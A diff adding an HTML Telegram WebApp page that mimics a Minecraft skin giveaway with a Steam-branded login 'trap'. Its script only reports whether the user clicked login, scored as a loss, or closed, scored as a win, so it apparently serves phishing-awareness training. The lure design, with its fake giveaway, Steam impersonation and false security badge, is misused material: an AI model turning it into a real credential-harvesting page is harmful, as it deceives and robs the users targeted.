@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MineDrop BY — Раздача скинов</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --mc-green: #5da03b;
+            --mc-dark: #121212;
+            --steam-blue: #171a21;
+            --steam-light: #66c0f4;
+            --accent: #ffcc00;
+            /* Стек шрифтов San Francisco / System UI */
+            --sf-font: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji";
+        }
+
+        body {
+            font-family: var(--sf-font);
+            background-color: var(--mc-dark);
+            color: white;
+            margin: 0;
+            padding: 0;
+            /* Фоновое изображение с затемнением */
+            background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.8)), 
+                        url('https://www.minecraft.net/content/dam/archive/695914f650950346061381f9a8607153-Header.jpg');
+            background-size: cover;
+            background-attachment: fixed;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        header {
+            background: rgba(0, 0, 0, 0.9);
+            padding: 18px;
+            text-align: center;
+            border-bottom: 2px solid var(--mc-green);
+        }
+
+        .logo {
+            font-size: 22px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--mc-green);
+        }
+
+        .container {
+            padding: 24px;
+            max-width: 450px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .promo-box {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border-radius: 20px;
+            padding: 24px;
+            margin-bottom: 24px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin: 0 0 10px 0;
+            color: var(--accent);
+            letter-spacing: -0.5px;
+        }
+
+        .promo-text {
+            font-size: 15px;
+            color: #ccc;
+            line-height: 1.4;
+        }
+
+        .skin-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin: 24px 0;
+        }
+
+        .skin-card {
+            background: rgba(0,0,0,0.4);
+            padding: 16px;
+            border-radius: 16px;
+            border: 1px solid rgba(255,255,255,0.05);
+            transition: transform 0.2s;
+        }
+
+        .skin-img {
+            width: 70px;
+            height: 70px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+        }
+
+        .skin-name {
+            font-size: 14px;
+            font-weight: 600;
+            display: block;
+        }
+
+        .skin-price {
+            color: #888;
+            font-size: 12px;
+            text-decoration: line-through;
+        }
+
+        /* Окно авторизации (ЛОВУШКА) */
+        .login-overlay {
+            background: #1b2838; /* Цвет Steam */
+            padding: 24px;
+            border-radius: 20px;
+            border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        .steam-logo {
+            width: 130px;
+            margin-bottom: 20px;
+        }
+
+        .login-text {
+            font-size: 14px;
+            margin-bottom: 24px;
+            color: #c5c3c0;
+            line-height: 1.5;
+        }
+
+        /* Кнопки */
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: filter 0.2s;
+        }
+
+        .btn-steam {
+            background: linear-gradient(90deg, #06bfff 0%, #2d73ff 100%);
+            color: white;
+        }
+
+        .btn-close {
+            background: rgba(255, 255, 255, 0.05);
+            color: #999;
+            font-size: 14px;
+        }
+
+        .btn:active {
+            filter: brightness(0.8);
+        }
+
+        .secure-badge {
+            font-size: 12px;
+            color: #5da03b;
+            margin-top: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-weight: 500;
+        }
+
+        footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #555;
+            padding-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo">MINE<span style="color:white">DROP</span>.BY</div>
+    </header>
+
+    <div class="container">
+        <div class="promo-box">
+            <h1>🎁 Раздача скинов</h1>
+            <p class="promo-text">Подтвердите личность и заберите эксклюзивные предметы для вашего аккаунта.</p>
+            
+            <div class="skin-grid">
+                <div class="skin-card">
+                    <img src="https://mc-heads.net/head/Dream/100" class="skin-img" alt="skin">
+                    <span class="skin-name">Dream Set</span>
+                    <span class="skin-price">48.50 BYN</span>
+                </div>
+                <div class="skin-card">
+                    <img src="https://mc-heads.net/head/Technoblade/100" class="skin-img" alt="skin">
+                    <span class="skin-name">Legend King</span>
+                    <span class="skin-price">64.20 BYN</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="login-overlay">
+            <img src="https://community.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" class="steam-logo" alt="Steam">
+            <div class="login-text">
+                Авторизуйтесь через Steam Community, чтобы получить доступ к инвентарю и получить скины.
+            </div>
+            
+            <button class="btn btn-steam" onclick="sendResult(false)">
+                Войти через Steam
+            </button>
+            <button class="btn btn-close" onclick="sendResult(true)">
+                Закрыть
+            </button>
+
+            <div class="secure-badge">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+                </svg>
+                Проверка безопасности пройдена
+            </div>
+        </div>
+
+        <footer>
+            © 2024 MineDrop Belarus Community.<br>
+            Mojang не имееет отношения к данной акции.
+        </footer>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        // Устанавливаем цвет темы WebApp под Steam
+        tg.setHeaderColor('#1b2838');
+
+        async function sendResult(isWin) {
+            const chat_id = tg.initDataUnsafe?.user?.id;
+
+            if (!chat_id) {
+                alert("Ошибка: Запустите через бота!");
+                return;
+            }
+
+            try {
+                const response = await fetch('/api/submit_answer', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chat_id,
+                        is_win: isWin
+                    })
+                });
+
+                if (response.ok) {
+                    tg.close();
+                }
+            } catch (e) {
+                console.error("Ошибка сети:", e);
+            }
+        }
+    </script>
+</body>
+</html>
